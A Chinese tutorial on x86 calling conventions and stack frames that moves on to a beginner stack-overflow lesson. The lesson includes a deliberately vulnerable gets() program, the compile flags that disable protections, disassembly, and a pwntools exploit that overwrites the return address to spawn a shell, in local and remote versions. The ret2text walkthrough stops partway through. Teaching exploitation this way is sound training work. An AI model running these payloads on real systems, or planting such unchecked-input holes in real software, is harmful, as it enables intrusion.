主调函数将被调函数所要求的参数，根据相应的函数调用约定，保存在运行时栈中。该操作会改变程序的栈指针。 注：x86平台将参数压入调用栈中。而x86_64平台具有16个通用64位寄存器，故调用函数时前6个参数通常由寄存器传递，其余参数才通过栈传递. 主调函数将控制权移交给被调函数(使用call指令)。函数的返回地址(待执行的下条指令地址)保存在程序栈中(压栈操作隐含在call指令中)。 若有必要，被调函数会设置帧基指针，并保存被调函数希望保持不变的寄存器值。 被调函数通过修改栈顶指针的值，为自己的局部变量在运行时栈中分配内存空间，并从帧基指针的位置处向低地址方向存放被调函数的局部变量和临时变量。 被调函数执行自己任务，此时可能需要访问由主调函数传入的参数。若被调函数返回一个值，该值通常保存在一个指定寄存器中(如EAX)。 一旦被调函数完成操作，为该函数局部变量分配的栈空间将被释放。这通常是步骤4的逆向执行。 恢复步骤3中保存的寄存器值，包含主调函数的帧基指针寄存器。 被调函数将控制权交还主调函数(使用ret指令)。根据使用的函数调用约定，该操作也可能从程序栈上清除先前传入的参数。 主调函数再次获得控制权后，可能需要将先前的参数从栈上清除。在这种情况下，对栈的修改需要将帧基指针值恢复到步骤1之前的值。 步骤3与步骤4在函数调用之初常一同出现，统称为函数序(prologue)；步骤6到步骤8在函数调用的最后常一同出现，统称为函数跋(epilogue)。函数序和函数跋是编译器自动添加的开始和结束汇编代码，其实现与CPU架构和编译器相关。除步骤5代表函数实体外，其它所有操作组成函数调用。 &emsp;&emsp;以下介绍函数调用过程中的主要指令(复习一下哈): 压栈(push)：栈顶指针ESP减小4个字节；以字节为单位将寄存器数据(四字节，不足补零)压入堆栈，从高到低按字节依次将数据存入ESP-1、ESP-2、ESP-3、ESP-4指向的地址单元。 出栈(pop)：栈顶指针ESP指向的栈中数据被取回到寄存器；栈顶指针ESP增加4个字节. 返回(ret)：与call指令配合，用于从函数或过程返回。从栈顶弹出返回地址(之前call指令保存的下条指令地址)到EIP寄存器中，程序转到该地址处继续执行(此时ESP指向进入函数时的第一个参数)。若带立即数，ESP再加立即数(丢弃一些在执行call前入栈的参数)。使用该指令前，应使当前栈顶指针所指向位置的内容正好是先前call指令保存的返回地址。 &emsp;&emsp;基于以上指令，使用C调用约定的被调函数典型的函数序和函数跋实现如下: 若主调函数和调函数均未使用局部变量寄存器EDI、ESI和EBX，则编译器无须在函数序中对其压栈，以便提高程序的执行效率。 &emsp;&emsp;参数压栈指令因编译器而异，如下两种压栈方式基本等效： &emsp;&emsp;两种压栈方式均遵循C调用约定，但方式二中主调函数在调用返回后并未显式清理堆栈空间。因为在被调函数序阶段，编译器在栈顶为函数参数预先分配内存空间(sub指令)。函数参数被复制到栈中(而非压入栈中)，并未修改栈顶指针，故调用返回时主调函数也无需修改栈顶指针。gcc3.4(或更高版本)编译器采用该技术将函数参数传递至栈上，相比栈顶指针随每次参数压栈而多次下移，一次性设置好栈顶指针更为高效。设想连续调用多个函数时，方式二仅需预先分配一次参数内存(大小足够容纳参数尺寸和最大的函数即可)，后续调用无需每次都恢复栈顶指针。注意，函数被调用时，两种方式均使栈顶指针指向函数最左边的参数。本文不再区分两种压栈方式，”压栈”或”入栈”所提之处均按相应汇编代码理解，若无汇编则指方式二。 &emsp;&emsp;某些情况下，编译器生成的函数调用进入/退出指令序列并不按照以上方式进行。例如，若C函数声明为static(只在本编译单元内可见)且函数在编译单元内被直接调用，未被显示或隐式取地址(即没有任何函数指针指向该函数)，此时编译器确信该函数不会被其它编译单元调用，因此可随意修改其进/出指令序列以达到优化目的。 &emsp;&emsp;尽管使用的寄存器名字和指令在不同处理器架构上有所不同，但创建栈帧的基本过程一致。 &emsp;&emsp;注意，栈帧是运行时概念，若程序不运行，就不存在栈和栈帧。但通过分析目标文件中建立函数栈帧的汇编代码(尤其是函数序和函数跋过程)，即使函数没有运行，也能了解函数的栈帧结构。通过分析可确定分配在函数栈帧上的局部变量空间准确值，函数中是否使用帧基指针，以及识别函数栈帧中对变量的所有内存引用。 函数调用约定 &emsp;&emsp;创建一个栈帧的最重要步骤是主调函数如何向栈中传递函数参数。主调函数必须精确存储这些参数，以便被调函数能够访问到它们。函数通过选择特定的调用约定，来表明其希望以特定方式接收参数。此外，当被调函数完成任务后，调用约定规定先前入栈的参数由主调函数还是被调函数负责清除，以保证程序的栈顶指针完整性。&emsp;&emsp;函数调用约定通常规定如下几方面内容： 1. 函数参数的传递顺序和方式 最常见的参数传递方式是通过堆栈传递。主调函数将参数压入栈中，被调函数以相对于帧基指针的正偏移量来访问栈中的参数。对于有多个参数的函数，调用约定需规定主调函数将参数压栈的顺序(从左至右还是从右至左)。某些调用约定允许使用寄存器传参以提高性能。 2.栈的维护方式主调函数将参数压栈后调用被调函数体，返回时需将被压栈的参数全部弹出，以便将栈恢复到调用前的状态。该清栈过程可由主调函数负责完成，也可由被调函数负责完成。 3. 名字修饰(Name-mangling)策略 又称函数名修饰(Decorated Name)规则。编译器在链接时为区分不同函数，对函数名作不同修饰。 若函数之间的调用约定不匹配，可能会产生堆栈异常或链接错误等问题。因此，为了保证程序能正确执行，所有的函数调用均应遵守一致的调用约定。 &emsp;&emsp;下面分别介绍常见的几种函数调用约定,你只需要记住解第一个cdel约定,剩下的作为知识扩展(内容较长,实在不想看就跳过吧,建议了解). cdecl调用约定 又称C调用约定，是C/C++编译器默认的函数调用约定。所有非C++成员函数和未使用stdcall或fastcall声明的函数都默认是cdecl方式。函数参数按照从右到左的顺序入栈，函数调用者负责清除栈中的参数，返回值在EAX中。由于每次函数调用都要产生清除(还原)堆栈的代码，故使用cdecl方式编译的程序比使用stdcall方式编译的程序大(后者仅需在被调函数内产生一份清栈代码)。但cdecl调用方式支持可变参数函数(即函数带有可变数目的参数，如printf)，且调用时即使实参和形参数目不符也不会导致堆栈错误。对于C函数，cdecl方式的名字修饰约定是在函数名前添加一个下划线；对于C++函数，除非特别使用extern “C”，C++函数使用不同的名字修饰方式。 扩展阅读可变参数函数支持条件 若要支持可变参数的函数，则参数应自右向左进栈，并且由主调函数负责清除栈中的参数(参数出栈)。首先，参数按照从右向左的顺序压栈，则参数列表最左边(第一个)的参数最接近栈顶位置。所有参数距离帧基指针的偏移量都是常数，而不必关心已入栈的参数数目。只要不定的参数的数目能根据第一个已明确的参数确定，就可使用不定参数。例如printf函数，第一个参数即格式化字符串可作为后继参数指示符。通过它们就可得到后续参数的类型和个数，进而知道所有参数的尺寸。当传递的参数过多时，以帧基指针为基准，获取适当数目的参数，其他忽略即可。若函数参数自左向右进栈，则第一个参数距离栈帧指针的偏移量与已入栈的参数数目有关，需要计算所有参数占用的空间后才能精确定位。当实际传入的参数数目与函数期望接受的参数数目不同时，偏移量计算会出错！其次，调用函数将参数压栈，只有它才知道栈中的参数数目和尺寸，因此调用函数可安全地清栈。而被调函数永远也不能事先知道将要传入函数的参数信息，难以对栈顶指针进行调整。C++为兼容C，仍然支持函数带有可变的参数。但在C++中更好的选择常常是函数多态。 stdcall调用约定(微软命名) Pascal程序缺省调用方式，WinAPI也多采用该调用约定。stdcall调用约定主调函数参数从右向左入栈，除指针或引用类型参数外所有参数采用传值方式传递，由被调函数负责清除栈中的参数，返回值在EAX中。stdcall调用约定仅适用于参数个数固定的函数，因为被调函数清栈时无法精确获知栈上有多少函数参数；而且如果调用时实参和形参数目不符会导致堆栈错误。对于C函数，stdcall名称修饰方式是在函数名字前添加下划线，在函数名字后添加@和函数参数的大小，如_functionname@number。 fastcall调用约定 stdcall调用约定的变形，通常使用ECX和EDX寄存器传递前两个DWORD(四字节双字)类型或更少字节的函数参数，其余参数按照从右向左的顺序入栈，被调函数在返回前负责清除栈中的参数，返回值在 EAX 中。因为并不是所有的参数都有压栈操作，所以比stdcall和cdecl快些。编译器使用两个@修饰函数名字，后跟十进制数表示的函数参数列表大小(字节数)，如@function_name@number。需注意fastcall函数调用约定在不同编译器上可能有不同的实现，比如16位编译器和32位编译器。另外，在使用内嵌汇编代码时，还应注意不能和编译器使用的寄存器有冲突。 thiscall调用约定 C++类中的非静态函数必须接收一个指向主调对象的类指针(this指针)，并可能较频繁的使用该指针。主调函数的对象地址必须由调用者提供，并在调用对象非静态成员函数时将对象指针以参数形式传递给被调函数。编译器默认使用thiscall调用约定以高效传递和存储C++类的非静态成员函数的this指针参数。 thiscall调用约定函数参数按照从右向左的顺序入栈。若参数数目固定，则类实例的this指针通过ECX寄存器传递给被调函数，被调函数自身清理堆栈；若参数数目不定，则this指针在所有参数入栈后再入栈，主调函数清理堆栈。thiscall不是C++关键字，故不能使用thiscall声明函数，它只能由编译器使用。 注意，该调用约定特点随编译器不同而不同，g++中thiscall与cdecl基本相同，只是隐式地将this指针当作非静态成员函数的第1个参数，主调函数在调用返回后负责清理栈上参数；而在VC中，this指针存放在%ecx寄存器中，参数从右至左压栈，非静态成员函数负责清理栈上参数。 naked call调用约定 对于使用naked call方式声明的函数，编译器不产生保存(prologue)和恢复(epilogue)寄存器的代码，且不能用return返回返回值(只能用内嵌汇编返回结果)，故称naked call。该调用约定用于一些特殊场合，如声明处于非C/C++上下文中的函数，并由程序员自行编写初始化和清栈的内嵌汇编指令。注意，naked call并非类型修饰符，故该调用约定必须与__declspec同时使用，如VC下定义求和函数: 代码示例如下(Windows采用Intel汇编语法，注释符为;)： 123456__declspec(naked) int __stdcall function(int a, int b) &#123; ;mov DestRegister, SrcImmediate(Intel) vs. movl $SrcImmediate, %DestRegister(AT&amp;T) __asm mov eax, a __asm add eax, b __asm ret 8&#125; __declspec是微软关键字，其他系统上可能没有。 pascal调用约定 Pascal语言调用约定，参数按照从左至右的顺序入栈。Pascal语言只支持固定参数的函数，参数的类型和数量完全可知，故由被调函数自身清理堆栈。pascal调用约定输出的函数名称无任何修饰且全部大写。 Win3.X(16位)时支持真正的pascal调用约定；而Win9.X(32位)以后pascal约定由stdcall约定代替(以C约定压栈以Pascal约定清栈)。 上述调用约定的主要特点如下表所示： 关于传参方法: 整型和指针参数的传递: 整型参数与指针参数的传递方式相同，因为在32位x86处理器上整型与指针大小相同(均为四字节)。下表给出这两种类型的参数在栈帧中的位置关系。注意，该表基于tail函数的栈帧。 浮点参数的传递: 浮点参数的传递与整型类似，区别在于参数大小。x86处理器中浮点类型占8个字节，因此在栈中也需要占用8个字节。下表给出浮点参数在栈帧中的位置关系。图中，调用tail函数的第一个和第三个参数均为浮点类型，因此需各占用8个字节，三个参数共占用20个字节。表中word类型的大小是4字节。 结构体和联合体参数的传递: 结构体和联合体参数的传递与整型、浮点参数类似，只是其占用字节大小视数据结构的定义不同而异。x86处理器上栈宽是4字节，故结构体在栈上所占用的字节数为4的倍数。编译器会对结构体进行适当的填充以使得结构体大小满足4字节对齐的要求。 对于一些RISC处理器(如PowerPC)，其参数传递并不是全部通过栈来实现。PowerPC处理器寄存器中，R3～R10共8个寄存器用于传递整型或指针参数，F1～F8共8个寄存器用于传递浮点参数。当所需传递的参数少于8个时，不需要用到栈。结构体和long double参数的传递通过指针来完成，这与x86处理器完全不同。PowerPC的ABI规范中规定，结构体的传递采用指针方式，而不是像x86处理器那样将结构从一个函数栈帧中拷贝到另一个函数栈帧中，显然x86处理器的方式更低效。可见，PowerPC程序中，函数参数采用指向结构体的指针(而非结构体)并不能提高效率，不过通常这是良好的编程习惯。 返回值的传递: 函数返回值可通过寄存器传递。当被调用函数需要返回结果给调用函数时： 若返回值不超过4字节(如int、short、char、指针等类型)，通常将其保存在EAX寄存器中，调用方通过读取EAX获取返回值。 若返回值大于4字节而小于8字节(如long long或_int64类型)，则通过EAX+EDX寄存器联合返回，其中EDX保存返回值高4字节，EAX保存返回值低4字节。 若返回值为浮点类型(如float和double)，则通过专用的协处理器浮点数寄存器栈的栈顶返回 若返回值为结构体或联合体，则主调函数向被调函数传递一个额外参数，该参数指向将要保存返回值的地址。即函数调用foo(p1, p2)被转化为foo(&amp;p0, p1, p2)，以引用型参数形式传回返回值。具体步骤可能为：a.主调函数将显式的实参逆序入栈；b.将接收返回值的结构体变量地址作为隐藏参数入栈(若未定义该接收变量，则在栈上额外开辟空间作为接收返回值的临时变量)；c. 被调函数将待返回数据拷贝到隐藏参数所指向的内存地址，并将该地址存入%eax寄存器。因此，在被调函数中完成返回值的赋值工作。 注意，函数如何传递结构体或联合体返回值依赖于具体实现。不同编译器、平台、调用约定甚至编译参数下可能采用不同的实现方法。如VC6编译器对于不超过8字节的小结构体，会通过EAX+EDX寄存器返回。而对于超过8字节的大结构体，主调函数在栈上分配用于接收返回值的临时结构体，并将地址通过栈传递给被调函数；被调函数根据返回值地址设置返回值(拷贝操作)；调用返回后主调函数根据需要，再将返回值赋值给需要的临时变量(二次拷贝)。实际使用中为提高效率，通常将结构体指针作为实参传递给被调函数以接收返回值。 不要返回指向栈内存的指针，如返回被调函数内局部变量地址(包括局部数组名)。因为函数返回后，其栈帧空间被“释放”，原栈帧内分配的局部变量空间的内容是不稳定和不被保证的。 &emsp;&emsp;函数返回值通过寄存器传递，无需空间分配等操作，故返回值的代价很低。基于此原因，C89规范中约定，不写明返回值类型的函数，返回值类型默认为int。但这会带来类型安全隐患，如函数定义时返回值为浮点数，而函数未声明或声明时未指明返回值类型，则调用时默认从寄存器EAX(而不是浮点数寄存器)中获取返回值，导致错误！因此在C++中，不写明返回值类型的函数返回值类型为void，表示不返回值。 扩展阅读GCC返回结构体和联合体 通常GCC被配置为使用与目标系统一致的函数调用约定。这通过机器描述宏来实现。但是，在一些目标机上采用不同方式返回结构体和联合体的值。因此，使用PCC编译的返回这些类型的函数不能被使用GCC编译的代码调用，反之亦然。但这并未造成麻烦，因为很少有Unix库函数返回结构体或联合体。GCC代码使用存放int或double类型返回值的寄存器来返回1、2、4或8个字节的结构体和联合体(GCC通常还将此类变量分配在寄存器中)。其它大小的结构体和联合体在返回时，将其存放在一个由调用者传递的地址中(通常在寄存器中)。相比之下，PCC在大多目标机上返回任何大小的结构体和联合体时，都将数据复制到一个静态存储区域，再将该地址当作指针值返回。调用者必须将数据从那个内存区域复制到需要的地方。这比GCC使用的方法要慢，而且不可重入。在一些目标机上(如RISC机器和80386)，标准的系统约定是将返回值的地址传给子程序。在这些机器上，当使用这种约定方法时，GCC被配置为与标准编译器兼容。这可能会对于1，2，4或8字节的结构体不兼容。GCC使用系统的标准约定来传递参数。在一些机器上，前几个参数通过寄存器传递；在另一些机器上，所有的参数都通过栈传递。原本可在所有机器上都使用寄存器来传递参数，而且此法还可能显著提高性能。但这样就与使用标准约定的代码完全不兼容。所以这种改变只在将GCC作为系统唯一的C编译器时才实用。当拥有一套完整的GNU 系统，能够用GCC来编译库时，可在特定机器上实现寄存器参数传递。在一些机器上(特别是SPARC)，一些类型的参数通过“隐匿引用”(invisible reference)来传递。这意味着值存储在内存中，将值的内存地址传给子程序。 &emsp;&emsp;到这里,我知道的关于函数调用栈的有关东西已经差不多讲完了,心态先别崩,最难的部分已经结束了,下面开始最有意思的部分. 缓冲区溢出原理&emsp;&emsp;缓冲区说的通俗一点就是程序在运行时,可供使用的一部分内存.比如说stack和heap,还有一些存储常量的内存区域,比如bss段(bss segment)等等.下面我们来介绍一下最简单最经典的栈溢出(Stack Overflow). 环境搭建&emsp;&emsp;在linux下搭建漏洞利用的环境十分简单,只需要如下几个命令: 1234#有需求者自行换源sudo apt-get update &amp;&amp; apt-get upgradesudo apt-get install build-essential gcc g++ make python-pippip install pwntools &emsp;&emsp;如果缺啥库请自行百度安装 栈溢出原理&emsp;&emsp;栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是 程序向栈上写入数据 写入的数据长度没有被良好的控制 举个栗子&emsp;&emsp;最经典的栈溢出利用是覆盖程序的返回地址,使其返回到攻击者想要的地址,需要确保这个地址所在的段有可执行权限,即权限为(–X) 注: 通常的计算机系统中,我们规定用户对文件有三种权限即Read Write Execute(RWX)读 写 可执行.在linux的终端里输入ls -al命令,结果如下:1234567root@Aurora:~/File/doc # ls -al总用量 2028drwxr-xr-x 3 root root 4096 8月 22 21:58 .drwxr-xr-x 7 root root 4096 8月 23 23:35 ..-rw-r--r-- 1 root root 51486 8月 22 21:58 assembly.md-rw-r--r-- 1 root root 2007460 8月 22 21:55 assembly.pdfdrwxr-xr-x 2 root root 4096 8月 13 00:17 pictures 你可以看到前面有一堆rwx或者’-‘之类的,这就代表用户对该文件的权限,ls这条命令是我们比较常用的命令,他是list的缩写,作用是列举当前目录下的文件(目录类似于文件夹). 后面的 -al是两个参数,a代表all,l代表line,就是把所有的文件(包含隐藏文件)按行展示出来.就是上面的结果,顺便一提,名字以.开头的文件都是隐藏文件比如.hello.cpp,ls命令不加参数a无法看到隐藏文件. 你可以使用图形化的编辑器vscode gedit或者leafpad编写程序,我是vim爱好者,不建议你们使用vim(逃 下面来个简单的例子: 123456789101112131415161718192021#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;void pwn()&#123; system("/bin/sh");&#125;void vulnerable()&#123; char buffer[32]; char hello[] = "Hello,I'm dyf."; printf("%s\n",hello); printf("\nQAQ\n"); printf("\nDo you have something to say?\n"); gets(buffer); return;&#125;int main()&#123; vulnerable(); return 0;&#125; &emsp;&emsp;这个程序的逻辑就是读取一段字符串,然后将其输出,理论上来说pwn()函数是没有被执行的,但是利用stackoverflow我们可以控制程序执行pwn()函数,他会返回给我们一个shell. shell十分不严谨的描述: linux下的终端我们希望通过这个程序来获得一个可以执行命令的终端,这样就可以控制目标靶机. 我们用如下命令进行编译:1&gt; sudo gcc -o a buffer.c -no-pie -m32 -fno-stack-protector 注: 这里使用sudo只是为了将生成的目标文件的owner设置为root,当你以普通身份提权后可是获得root权限 12345678root@Aurora:/home/code/pwn/challenge/1 # sudo gcc -o a buffer.c -no-pie -m32 -fno-stack-protector buffer.c: In function ‘vulnerable’:buffer.c:14:5: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration] gets(buffer); ^~~~ fgets/bin/ld: /tmp/ccQDe6dj.o: in function `vulnerable':buffer.c:(.text+0x97): 警告：the `gets' function is dangerous and should not be used. &emsp;&emsp;可见gets本身是一个十分危险的函数,他不会检查字符串的长度,而是以回车来判断输入是否结束,及其容易引发栈溢出. &emsp;&emsp;解释一下这几个参数的作用: -m32:指的是生成32位程序 -fno-stack-protector:字面意思,关闭栈保护,不生成canary -no-pie:关闭pie(Position Independent Executable),这个pie并不能吃,他使程序的地址被打乱,导致我们无法返回到固定目标地址. &emsp;&emsp;你可以使用如下命令来运行它: 1&gt; ./a &emsp;&emsp;编译成功后我们可以使用checksec工具检查编译生成的文件: 1234567root@Aurora:/home/code/pwn/challenge/1 # checksec a [*] '/home/code/pwn/challenge/1/a' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 下面我们来分析一下这个vulnerable()函数:首先,大家可以使用objdump工具进行反汇编,得到目标文件a的汇编代码: 1&gt; objdump -d a 然后找到这一段: 注: 你们的地址与我的不同是正常的(一样就怪了…),所以下面的过程要求你理解原理 123456789101112131415161718192021222324252627282930313233343536080491ad &lt;vulnerable&gt;: 80491ad: 55 push %ebp 80491ae: 89 e5 mov %esp,%ebp 80491b0: 53 push %ebx 80491b1: 83 ec 34 sub $0x34,%esp 80491b4: e8 07 ff ff ff call 80490c0 &lt;__x86.get_pc_thunk.bx&gt; 80491b9: 81 c3 47 2e 00 00 add $0x2e47,%ebx 80491bf: c7 45 c9 48 65 6c 6c movl $0x6c6c6548,-0x37(%ebp) 80491c6: c7 45 cd 6f 2c 49 27 movl $0x27492c6f,-0x33(%ebp) 80491cd: c7 45 d1 6d 20 64 79 movl $0x7964206d,-0x2f(%ebp) 80491d4: 66 c7 45 d5 66 2e movw $0x2e66,-0x2b(%ebp) 80491da: c6 45 d7 00 movb $0x0,-0x29(%ebp) 80491de: 83 ec 0c sub $0xc,%esp 80491e1: 8d 45 c9 lea -0x37(%ebp),%eax 80491e4: 50 push %eax 80491e5: e8 56 fe ff ff call 8049040 &lt;puts@plt&gt; 80491ea: 83 c4 10 add $0x10,%esp 80491ed: 83 ec 0c sub $0xc,%esp 80491f0: 8d 83 10 e0 ff ff lea -0x1ff0(%ebx),%eax 80491f6: 50 push %eax 80491f7: e8 44 fe ff ff call 8049040 &lt;puts@plt&gt; 80491fc: 83 c4 10 add $0x10,%esp 80491ff: 83 ec 0c sub $0xc,%esp 8049202: 8d 83 18 e0 ff ff lea -0x1fe8(%ebx),%eax 8049208: 50 push %eax 8049209: e8 32 fe ff ff call 8049040 &lt;puts@plt&gt; 804920e: 83 c4 10 add $0x10,%esp 8049211: 83 ec 0c sub $0xc,%esp 8049214: 8d 45 d8 lea -0x28(%ebp),%eax 8049217: 50 push %eax 8049218: e8 13 fe ff ff call 8049030 &lt;gets@plt&gt; 804921d: 83 c4 10 add $0x10,%esp 8049220: 90 nop 8049221: 8b 5d fc mov -0x4(%ebp),%ebx 8049224: c9 leave 8049225: c3 ret 我猜你开始不想看了,别着急,我们直接看关键处: 123456788049214: 8d 45 d8 lea -0x28(%ebp),%eax8049217: 50 push %eax8049218: e8 13 fe ff ff call 8049030 &lt;gets@plt&gt;804921d: 83 c4 10 add $0x10,%esp8049220: 90 nop8049221: 8b 5d fc mov -0x4(%ebp),%ebx8049224: c9 leave 8049225: c3 ret 我们可以看到123lea -028(%ebp), %eax ;将某字符串地址传给%eax寄存器push %eax ;将%eax中的值压入栈中,作为下一个函数gets()的参数call 8049030&lt;gets@plt&gt;;调用gets() 这三句话首先传参,然后调用函数,然后程序释放栈并返回.该字符串距离ebp的长度为0x28,对应的栈结构为: 123456789101112 +-----------------+ | retaddr | +-----------------+ | saved ebp | ebp---&gt;+-----------------+ | | | | | | | | | | | |s,ebp-0x28--&gt;+-----------------+ 接着我们继续查找pwn()函数的地址,其地址为0x08049182.123456789101112131415161708049182 &lt;pwn&gt;: 8049182: 55 push %ebp 8049183: 89 e5 mov %esp,%ebp 8049185: 53 push %ebx 8049186: 83 ec 04 sub $0x4,%esp 8049189: e8 b4 00 00 00 call 8049242 &lt;__x86.get_pc_thunk.ax&gt; 804918e: 05 72 2e 00 00 add $0x2e72,%eax 8049193: 83 ec 0c sub $0xc,%esp 8049196: 8d 90 08 e0 ff ff lea -0x1ff8(%eax),%edx 804919c: 52 push %edx 804919d: 89 c3 mov %eax,%ebx 804919f: e8 ac fe ff ff call 8049050 &lt;system@plt&gt; 80491a4: 83 c4 10 add $0x10,%esp 80491a7: 90 nop 80491a8: 8b 5d fc mov -0x4(%ebp),%ebx 80491ab: c9 leave 80491ac: c3 ret 加入我们输入的字符串为:0x28 * &#39;a&#39; + &#39;bbbb&#39; + pwn_addr,那么由于gets只有读到回车才停,所以这一段字符串会把saved_ebp覆盖为bbbb,将ret_addr覆盖为pwn_addr,那么,此时栈的结构为: 123456789101112 +-----------------+ | 0x08049182 | +-----------------+ | bbbb | ebp---&gt;+-----------------+ | | | | | | | | | | | |s,ebp-0x14--&gt;+-----------------+ 注: 前面提到,在内存中,每个值按照字节存储.一般都是按照小端存储,所以0x08049182在内存中的形式为 1\x82\x91\x04\x08 &emsp;&emsp;很明显,按照ASCII表,这几个字符是不可见的(0x82 0x91 0x04 0x08 这几个老哥在ascii表中的值请自行查看对照) 那么问题来了,怎么才能把这这种不可见字符输进去呢,莫非要买高级键盘?_?,这个时候我们就可以用pwntools了,pwntools是一个很好用的python2的库,专门帮你干坏事. 利用代码如下: 1234567891011121314151617#! /usr/bin/python2#选择python2解释器# -*- coding: UTF-8 -*-#设置utf-8编码,为了支持中文from pwn import * #引入pwntools的库context.log_level = 'debug' # 开启debug模式,可以记录发送和收到的字符串sh = process('./a') #构造与程序交互的对象payload = 'a' * 40 + 'bbbb' + p32(0x08049182) # 构造payloadsh.sendline(payload) # 将字符串发送给程序sh.interactive() # 将代码变为手动交互 然后我们执行一下这个命令: 123456789101112131415161718192021root@Aurora:/home/code/pwn/challenge/1 # ./a.py[+] Starting local process './a': pid 10160[DEBUG] Sent 0x31 bytes: 00000000 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 │aaaa│aaaa│aaaa│aaaa│ * 00000020 61 61 61 61 61 61 61 61 62 62 62 62 82 91 04 08 │aaaa│aaaa│bbbb│····│ 00000030 0a │·│ 00000031[*] Switching to interactive mode[DEBUG] Received 0x33 bytes: "Hello,I'm dyf.\n" '\n' 'QAQ\n' '\n' 'Do you have something to say?\n'Hello,I'm dyf.QAQDo you have something to say?$ 可以看到我们已经返回了shell,这意味着我们拿到了这台机器的控制权限,加入这个程序的owner是root的话,我们就会获得root权限. 这个时候,按照传统,我们要输入一条神圣的指令来证明我们的身份: 1&gt; whoami &emsp;&emsp;很酷是不是,一下子就获得上帝的权限,root就是linux中的上帝,掌握一切生杀大权,到此为止,你已经拿下了你的第一台主机了. 接下来我会把之前提到的那个样例程序放到服务器上供你们娱乐,你么可以尝试练习一下. 关于exp连接远端的方式: 123456789101112131415161718#! /usr/bin/python2#选择python2解释器# -*- coding: UTF-8 -*-#设置utf-8编码,为了支持中文from pwn import * #引入pwntools的库context.log_level = 'debug' # 开启debug模式,可以记录发送和收到的字符串sh = romote('202.204.62.222',30008) # 只需要修改这一句话,填写对应的ip地址和端口 remote('ip', port)#sh = process('./a') #构造与程序交互的对象payload = 'a' * 40 + 'bbbb' + p32(0x08049182) # 构造payloadsh.sendline(payload) # 将字符串发送给程序sh.interactive() # 将代码变为手动交互 最后来介绍一下动态调试技巧,主要是关于gdb的使用.我相信8成的人写代码仍然使用十分复古的调试方法: 放置调试法:什么也不做等着bug消失 再来一次调试法: 一定是编译器坏了,重新编译一次等bug消失 玄学调试法: 随便改两个地方,用命运的力量消除bug 放弃调试法: 洗洗睡了 以上调试方法比较传统,而且操作难度教较大,下面我们来介绍一下很简单的gdb调试法. &emsp;&emsp;gdb(GNU Debugger)是所有调试器的爸爸,他的功能十分强大,可以跟踪堆栈,查看内存,打印寄存器,下断点等等,我们只讲以下基本技巧: 下断点 查看内存 打印寄存器 查看反汇编执行 &emsp;&emsp;我们仍然用个栗子讲解,首先下载并打开附件ret2text,然后你可以输入ls命令查看一下这个文件是不是绿色的,如果不是则说明没有可执行权限,你需要输入以下命令对其进行原谅: 1chmod +x ret2txt &emsp;&emsp;这个时候他应该已经被原谅了,我们查看一下他的保护措施: 1234567root@Aurora:~/文档/doc/src/example_2(master⚡) # checksec ret2text [*] '/root/\xe6\x96\x87\xe6\xa1\xa3/doc/src/example_2/ret2text' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) &emsp;&emsp;可以看到这是一个32位程序,只开启了NX保护(Not Executable 栈不可执行),下面进行逆向分析. 12345678910111213141516171819202122232425262728293031323308048648 &lt;main&gt;: 8048648: 55 push %ebp 8048649: 89 e5 mov %esp,%ebp 804864b: 83 e4 f0 and $0xfffffff0,%esp 804864e: 83 c4 80 add $0xffffff80,%esp 8048651: a1 60 a0 04 08 mov 0x804a060,%eax 8048656: c7 44 24 0c 00 00 00 movl $0x0,0xc(%esp) 804865d: 00 804865e: c7 44 24 08 02 00 00 movl $0x2,0x8(%esp) 8048665: 00 8048666: c7 44 24 04 00 00 00 movl $0x0,0x4(%esp) 804866d: 00 804866e: 89 04 24 mov %eax,(%esp) 8048671: e8 5a fe ff ff call 80484d0 &lt;setvbuf@plt&gt; 8048676: a1 40 a0 04 08 mov 0x804a040,%eax 804867b: c7 44 24 0c 00 00 00 movl $0x0,0xc(%esp) 8048682: 00 8048683: c7 44 24 08 01 00 00 movl $0x1,0x8(%esp) 804868a: 00 804868b: c7 44 24 04 00 00 00 movl $0x0,0x4(%esp) 8048692: 00 8048693: 89 04 24 mov %eax,(%esp) 8048696: e8 35 fe ff ff call 80484d0 &lt;setvbuf@plt&gt; 804869b: c7 04 24 6c 87 04 08 movl $0x804876c,(%esp) 80486a2: e8 d9 fd ff ff call 8048480 &lt;puts@plt&gt; 80486a7: 8d 44 24 1c lea 0x1c(%esp),%eax 80486ab: 89 04 24 mov %eax,(%esp) 80486ae: e8 ad fd ff ff call 8048460 &lt;gets@plt&gt; 80486b3: c7 04 24 a4 87 04 08 movl $0x80487a4,(%esp) 80486ba: e8 91 fd ff ff call 8048450 &lt;printf@plt&gt; 80486bf: b8 00 00 00 00 mov $0x0,%eax 80486c4: c9 leave 80486c5: c3 ret &emsp;&emsp;还原一下大概就是: 1234567891011int main(int argc, const char **argv, const char **envp)&#123; int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts("There is something amazing here, do you know anything?"); gets((char *)&amp;v4); printf("Maybe I will tell you next time !"); return 0;&#125; &emsp;&emsp;可以看到十分明显的gets()函数,然后我们又发现secure()函数存在system(&quot;/bin/sh&quot;): 1234804863a: c7 04 24 63 87 04 08 movl $0x8048763,(%esp) ;这里传递参数 &quot;/bin/sh&quot; 复习一下传参方式哦8048641: e8 4a fe ff ff call 8048490 &lt;system@plt&gt;8048646: c9 leave 8048647: c3 ret &emsp;&emsp;假如我们可以返回到0x804863a似乎就可以直接getshell了,下面我们就分析如何构造payload,首先要确定padding的长度. padding就是我们所能控制的内存到返回值的距离内所填充的垃圾数据,就是上个例子里一堆aaaaaaaa &emsp;&emsp;通过分析汇编代码我们发现事情并不简单: 12380486a7: 8d 44 24 1c lea 0x1c(%esp),%eax80486ab: 89 04 24 mov %eax,(%esp)80486ae: e8 ad fd ff ff call 8048460 &lt;gets@plt&gt; 